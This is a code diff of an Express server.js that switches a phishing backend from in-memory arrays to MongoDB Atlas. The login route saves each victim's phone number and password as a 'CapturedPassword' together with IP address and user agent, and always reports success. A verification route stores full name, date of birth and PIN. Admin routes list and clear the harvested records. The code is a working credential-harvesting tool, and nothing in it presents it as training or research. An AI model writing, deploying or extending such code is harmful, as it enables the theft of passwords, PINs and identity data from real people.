@@ -1,5 +1,6 @@
 // server.js
 const express = require('express');
+const mongoose = require('mongoose');
 const path = require('path');
 require('dotenv').config();
 
@@ -11,26 +12,51 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// --- In-Memory Storage (Replaces MongoDB) ---
-const capturedPasswords = [];
-const userVerifications = [];
-let nextPasswordId = 1;
-let nextVerificationId = 1;
+// --- Connect to MongoDB Atlas ---
+mongoose.connect(process.env.MONGODB_URI)
+.then(() => {
+    console.log('Successfully connected to MongoDB Atlas');
+})
+.catch(err => {
+    console.error('Error connecting to MongoDB Atlas:', err.message); 
+});
 
-// --- API Routes ---
-app.post('/api/login', (req, res) => {
+// --- Define MongoDB Schemas and Models ---
+const passwordSchema = new mongoose.Schema({
+    userId: String,
+    password: String,
+    timestamp: { type: Date, default: Date.now },
+    userAgent: String,
+    ipAddress: String,
+    attemptNumber: Number,
+});
+
+const verificationSchema = new mongoose.Schema({
+    userId: String,
+    fullName: String,
+    dob: Date,
+    problem: String,
+    pin: String,
+    experience: String,
+    capturedPassword: String,
+    createdAt: { type: Date, default: Date.now },
+});
+
+const CapturedPassword = mongoose.model('CapturedPassword', passwordSchema);
+const UserVerification = mongoose.model('UserVerification', verificationSchema);
+
+// --- API Routes (now using Mongoose) ---
+app.post('/api/login', async (req, res) => {
     try {
         const { phone, password, attemptNumber } = req.body;
-        const newPassword = {
-            _id: nextPasswordId++,
+        const newPassword = new CapturedPassword({
             userId: phone,
             password,
             attemptNumber,
             userAgent: req.headers['user-agent'],
             ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
-            timestamp: new Date()
-        };
-        capturedPasswords.push(newPassword);
+        });
+        await newPassword.save();
 
         res.json({ success: true, message: 'Login successful', user: { id: phone, phone } });
     } catch (error) {
@@ -39,14 +65,10 @@ app.post('/api/login', (req, res) => {
     }
 });
 
-app.post('/api/verification', (req, res) => {
+app.post('/api/verification', async (req, res) => {
     try {
-        const newVerification = {
-            _id: nextVerificationId++,
-            ...req.body,
-            createdAt: new Date()
-        };
-        userVerifications.push(newVerification);
+        const newVerification = new UserVerification(req.body);
+        await newVerification.save();
         res.json({ success: true, message: 'Verification submitted successfully!' });
     } catch (error) {
         console.error('Verification error:', error);
@@ -54,76 +76,65 @@ app.post('/api/verification', (req, res) => {
     }
 });
 
-// --- Admin Routes ---
+// --- Admin Routes (now using Mongoose) ---
 app.post('/admin/login', (req, res) => {
     const { password } = req.body;
-    // Default master password to 'admin123' if not set
-    const masterPassword = process.env.ADMIN_MASTER_PASSWORD || 'admin123';
-    if (password && password === masterPassword) {
+    if (password && password === process.env.ADMIN_MASTER_PASSWORD) {
         res.json({ success: true });
     } else {
         res.status(401).json({ success: false, message: 'Invalid master password' });
     }
 });
 
-app.get('/admin/captured-passwords', (req, res) => {
+app.get('/admin/captured-passwords', async (req, res) => {
     try {
-        // Sort descending by timestamp
-        const sorted = [...capturedPasswords].sort((a, b) => b.timestamp - a.timestamp);
-        res.json(sorted);
+        const passwords = await CapturedPassword.find().sort({ timestamp: -1 });
+        res.json(passwords);
     } catch (error) {
         res.status(500).json({ error: 'Failed to fetch data' });
     }
 });
 
-app.get('/admin/verifications', (req, res) => {
+app.get('/admin/verifications', async (req, res) => {
     try {
-        const sorted = [...userVerifications].sort((a, b) => b.createdAt - a.createdAt);
-        res.json(sorted);
+        const verifications = await UserVerification.find().sort({ createdAt: -1 });
+        res.json(verifications);
     } catch(error) {
         res.status(500).json({ error: 'Failed to fetch data' });
     }
 });
 
-// --- Delete Routes ---
-app.delete('/admin/delete-password/:id', (req, res) => {
+// --- NEW: Delete Routes ---
+app.delete('/admin/delete-password/:id', async (req, res) => {
     try {
-        const id = parseInt(req.params.id);
-        const index = capturedPasswords.findIndex(p => p._id === id);
-        if (index > -1) {
-            capturedPasswords.splice(index, 1);
-        }
+        await CapturedPassword.findByIdAndDelete(req.params.id);
         res.json({ success: true, message: 'Password entry deleted' });
     } catch (error) {
         res.status(500).json({ error: 'Failed to delete entry' });
     }
 });
 
-app.delete('/admin/delete-verification/:id', (req, res) => {
+app.delete('/admin/delete-verification/:id', async (req, res) => {
     try {
-        const id = parseInt(req.params.id);
-        const index = userVerifications.findIndex(v => v._id === id);
-        if (index > -1) {
-            userVerifications.splice(index, 1);
-        }
+        await UserVerification.findByIdAndDelete(req.params.id);
         res.json({ success: true, message: 'Verification entry deleted' });
     } catch (error) {
         res.status(500).json({ error: 'Failed to delete entry' });
     }
 });
 
-app.delete('/admin/clear-passwords', (req, res) => {
+app.delete('/admin/clear-passwords', async (req, res) => {
     try {
-        capturedPasswords.length = 0;
+        await CapturedPassword.deleteMany({});
         res.json({ success: true, message: 'All password entries cleared' });
     } catch (error) {
         res.status(500).json({ error: 'Failed to clear data' });
     }
 });
 
-app.delete('/admin/clear-verifications', (req, res) => {
+app.delete('/admin/clear-verifications', async (req, res) => {
     try {
-        userVerifications.length = 0;
+        await UserVerification.deleteMany({});
         res.json({ success: true, message: 'All verification entries cleared' });
     } catch (error) {
         res.status(500).json({ error: 'Failed to clear data' });
@@ -141,6 +152,10 @@ app.get('*', (req, res) => {
 });
 
 
-app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
-});
+if (process.env.NODE_ENV !== 'production') {
+    app.listen(port, () => {
+        console.log(`Server is running on port ${port}`);
+    });
+}
+
+module.exports = app;
